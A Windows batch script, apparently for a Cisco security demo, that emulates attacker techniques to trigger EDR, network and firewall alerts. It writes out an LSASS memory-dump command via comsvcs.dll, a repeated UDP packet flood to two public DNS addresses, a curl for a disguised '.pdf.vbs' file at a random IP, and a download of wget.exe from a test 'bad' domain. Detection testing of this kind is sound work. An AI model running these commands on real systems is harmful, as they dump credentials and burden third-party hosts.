@echo off
echo XX    XX DDDDDD   RRRRRR
echo  XX  XX  DD   DD  RR   RR
echo   XXXX   DD    DD RR   RR
echo   XXXX   DD    DD RRRRRR
echo  XX  XX  DD   DD  RR  RR
echo XX    XX DDDDDD   RR   RR
echo.
echo For details or assistance with this script, contact Darryl Hicks (darhicks@cisco.com)
echo.
echo.
echo.
setlocal enabledelayedexpansion
:menu
cls
echo Choose an option:
echo 1) EDR trigger
echo 2) NVM trigger
echo 3) NDR trigger
echo 4) Firewall trigger
echo 5) ALL TRIGGERS
::echo 6) Umbrella Trigger
set /p choice=Enter your choice (1-5):

if "%choice%"=="1" goto edr
if "%choice%"=="2" goto nvm
if "%choice%"=="3" goto ndr
if "%choice%"=="4" goto firewall
if "%choice%"=="5" goto all
::if "%choice%"=="6" goto umbrella

echo Invalid choice. Please try again.
pause
goto menu

:edr
echo.
echo EDR: This will trigger an "LSASS Memory Dump via comsvcs" and "W32.ComsvcsDumpedMemory.ioc" EDR alert by attempting to dump Lsass memory into a file called lsass.dmp, however the Lsass PID is not included so the attempt will fail.
echo.
echo.
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
echo.
echo Completed Successfully
echo.
goto end

:nvm
echo.
echo This triggers "Environment Variables for Payload Execution" and "Content Download Using Powershell" NVM Alerts by using powershell to download a picture from Cisco.com into temp using a variable, and then removing the file.
echo.
echo.
powershell -command "Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg' -Outfile \"$env:TEMP\Wallpaper.jpg\"; Remove-Item \"$env:TEMP\Wallpaper.jpg\""
echo.
echo Completed Successfully
echo.
goto end

:ndr
:: Batch file to emulate DNS abuse using PowerShell
echo.
echo To trigger network detection, this DNS Abuse emulation performs 1200 byte, slow, UDP Ping to IP 64.102.6.247, 10,000 times.
echo This is followed by the same technique to 64.102.6.247.
echo.
echo This will take some time.......
echo.
:: Task 1: Ping 75.75.75.75 UDP port 53
echo Starting Task 1: Pinging 75.75.75.75 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 75.75.75.75' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('75.75.75.75', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
timeout /t 30
echo.
echo Starting Task 2: Pinging 64.102.6.247 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 64.102.6.247' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('64.102.6.247', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
echo Tasks completed.
goto end

:umbrella
::echo.
::echo.
::echo This command will Trigger DNS security by attempting a wget to a malicous looking (benign) site internetbadguys.com. 
::echo It is expected this attempt will fail. Please wait.
::echo.
::echo.
::This 146.112.61.107 address is an Umbrella test IP referenced here: ::https://support.umbrella.com/hc/en-us/articles/115001357688-What-are-the-Cisco-Umbrella-Block-Page-IP-Addresses

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://internetbadguys.com/wget.exe','C:\temp\wget.exe')"
echo.
echo The Umbrella Trigger Completed Successfully!
echo.
goto end

:firewall
echo.
echo This triggers a firewall "Potentially Hidden File Extension" Alert by attempting a CURL for vbs script from never before seen IP address.
echo. 
echo It is expected this attempt will fail. Please wait.
echo.
echo.
:: Generate random IP
set /a x1=(%RANDOM% %% 255)
set /a x2=(%RANDOM% %% 255)
set /a x3=(%RANDOM% %% 255)
set /a x4=(%RANDOM% %% 255)
:: Construct the URL with random IP
set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
:: Execute curl command
@echo on
curl "%url%"
@echo off
echo.
echo.
echo The trigger Completed Successfully!
echo.
goto end

:all
echo.
::EDR
echo EDR: This will trigger an "LSASS Memory Dump via comsvcs" and "W32.ComsvcsDumpedMemory.ioc" EDR alert by attempting to dump Lsass memory into a file called lsass.dmp, however the Lsass PID is not included so the attempt will fail.
echo.
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
echo.
::NVM
echo NVM: This trigger will download a picture from Cisco from Cisco into memory, and then remove it using a variable.
powershell -command "Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg' -Outfile \"$env:TEMP\Wallpaper.jpg\"; Remove-Item \"$env:TEMP\Wallpaper.jpg\""
::UMBRELLA
::echo.
::echo.
::echo.
::powershell -c "(new-object System.Net.WebClient).DownloadFile('http://internetbadguys.com/wget.exe','C:\temp\wget.exe')"
::echo.
::FIREWALL
echo.
echo Firewall: This command will Trigger a Firewall DNS Alert by attempting a wget to a malicous looking (benign) site internetbadguys.com. It is expected this attempt will fail. Please wait.
echo.
echo It is expected this attempt will fail. Please wait.
set /a x1=(%RANDOM% %% 256)
set /a x2=(%RANDOM% %% 256)
set /a x3=(%RANDOM% %% 256)
set /a x4=(%RANDOM% %% 256)
set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
curl "%url%"
::NDR
:: Batch file to emulate DNS abuse using PowerShell
echo.
echo To trigger network detection, this DNS Abuse emulation performs 1200 byte, slow, UDP Ping to IP 64.102.6.247, 10,000 times.
echo This is followed by the same technique to 64.102.6.247.
echo.
echo This will take some time.......
echo.
:: Task 1: Ping 75.75.75.75 UDP port 53
echo Starting Task 1: Pinging 75.75.75.75 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 75.75.75.75' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('75.75.75.75', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
timeout /t 30
echo.
echo Starting Task 2: Pinging 64.102.6.247 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 64.102.6.247' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('64.102.6.247', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
echo Network Emulation Tasks completed.
echo.
echo.
echo Failures were expected. All Tests Completed Successfully!
echo.
goto end

:end
pause
goto menu
